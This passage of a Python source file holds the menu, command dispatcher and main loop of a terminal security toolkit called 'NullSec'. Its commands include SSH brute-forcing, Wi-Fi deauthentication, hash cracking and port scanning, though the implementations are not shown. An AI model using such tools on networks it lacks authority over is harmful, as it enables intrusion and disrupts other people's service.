  [{RED}Network{RESET}]    ping  myip  dns  whois  portscan  headers  subdomains  geoip  bannergrab  sshbrute  wifideauth
  [{RED}System{RESET}]     sysinfo  fcheck
  [{RED}Crypto{RESET}]     encode  decode  url  rot  hashcrack  jwt
  [{RED}Analysis{RESET}]   passcheck  strings  hexdump
  [{RED}Files{RESET}]      ls  cd  pwd  open  echo  clear
  [{RED}Other{RESET}]      theme  changelog  plugtoggle  back  help  exit
    """)
    console.print(
        Panel(menu_options, title="NullSec Commands", border_style=RICH_STYLE)
    )

    if show_plugins and plugins:
        plugin_cmds = "  ".join(
            "  ".join(p.get("commands", [])) for p in plugins.values()
        )
        plugin_text = Text.from_ansi(plugin_cmds)
        console.print(
            Panel(
                plugin_text, title=f"Plugins ({len(plugins)})", border_style=RICH_STYLE
            )
        )


def show_banner():
    banner()
    menu()

def handle_plugtoggle(args):
    from plugins import PLUGINS

    global show_plugins

    if not PLUGINS:
        console.print(
            Text.from_ansi(f"[{YELLOW}!{RESET}] No plugins found in plugins folder")
        )
        return

    if args and args[0].lower() in ("on", "1", "true"):
        show_plugins = True
    elif args and args[0].lower() in ("off", "0", "false"):
        show_plugins = False
    else:
        show_plugins = not show_plugins

    status = "ON" if show_plugins else "OFF"
    console.print(Text.from_ansi(f"[{GREEN}![{RESET}] Plugins panel: {status}"))


def show_banner():
    banner()
    menu()


def input_loop():
    commands = {
        "clear": handle_clear,
        "cls": handle_clear,
        "c": handle_clear,
        "exit": handle_exit,
        "e": handle_exit,
        "echo": handle_echo,
        "cd": handle_cd,
        "pwd": handle_pwd,
        "help": handle_help,
        "open": handle_open,
        "ls": handle_ls,
        "dir": handle_ls,
        "ping": handle_ping,
        "myip": handle_myip,
        "dns": handle_dns,
        "whois": handle_whois,
        "portscan": handle_portscan,
        "headers": handle_headers,
        "subdomains": handle_subdomains,
        "sysinfo": handle_sysinfo,
        "fcheck": handle_fcheck,
        "encode": handle_encode,
        "decode": handle_decode,
        "rot": handle_rot,
        "hashcrack": handle_hashcrack,
        "jwt": handle_jwt,
        "geoip": handle_geoip,
        "url": handle_urlencode,
        "passcheck": handle_passcheck,
        "bannergrab": handle_bannergrab,
        "strings": handle_strings,
        "hexdump": handle_hexdump,
        "sshbrute": handle_sshbrute,
        "wifideauth": handle_wifideauth,
        "theme": handle_theme,
        "changelog": handle_changelog,
        "back": handle_back,
        "plugtoggle": handle_plugtoggle,
    }

    # tab completion
    def completer(text, state):
        options = [c for c in commands if c.startswith(text)]
        return options[state] if state < len(options) else None

    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")

    while True:
        from plugins import load_plugins, get_plugin_commands, call_plugin, PLUGINS

        load_plugins()
        plugin_commands = get_plugin_commands()

        for p in PLUGINS:
            for c in p.get("commands", []):
                commands[c] = lambda args, p=p: p["handler"](args)

        uin = input(f"""
{RED}┌──{RESET}({username_pc}{RED}@{RESET}{os_name}){RED}─{RESET}[~/{RED}Null{RESET}Sec {RED}{version}{RESET}]
{RED}│{RESET}
{RED}└─{RESET}$ """)

        if not uin.strip():
            continue

        parts = uin.split()
        cmd = parts[0].lower()
        args = parts[1:]

        action = commands.get(cmd)
        if action:
            action(args)
        elif cmd in plugin_commands:
            call_plugin(cmd, args)
        else:
            console.print(
                Text.from_ansi(f"[{RED}!{RESET}] Unknown command: {cmd} — type help")
            )


def main():
    clear()
    banner()
    menu()
    sutils()
    try:
        input_loop()
    except SystemExit as e:
        if str(e) == "__back__":
            # return to launcher
            import launcher

            launcher.main()
        else:
            sys.exit()


if __name__ == "__main__":
    main()
